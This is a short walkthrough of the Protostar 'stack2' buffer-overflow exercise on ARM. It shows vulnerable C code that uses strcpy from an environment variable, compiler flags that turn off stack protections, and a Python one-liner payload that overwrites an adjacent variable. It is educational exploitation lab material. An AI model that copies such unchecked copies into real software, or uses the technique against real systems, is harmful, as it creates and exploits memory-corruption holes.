## Protostar ARM ./stack2


#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

#### _Let's start_

This challenge is pretty similar to the challange `stack0` except for:
* Data is passed via an environment variable
* The value of the variable `GREENIE`  has to be modified with a specific value `0x0d0a0d0a`


Let's compile
```c
gcc -g -fno-stack-protector -z execstack -no-pie -o stack2 stack2.c
```
We can use a similar workaround from the challenge `stack0` but also in this case, after that we fill the buffer variable with the char 'A', we will write as 65th byte the value checked in the if branch (little endian) and this value will be passed via an environment variable called `GREENIE`.

So, let's create an environment variable called `GREENIE` which contains our payload and then we execute the binary.

```c
pi@raspberrypi:~/protostar/stack2 $ GREENIE=`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"` ./stack2
you have correctly modified the variable
```
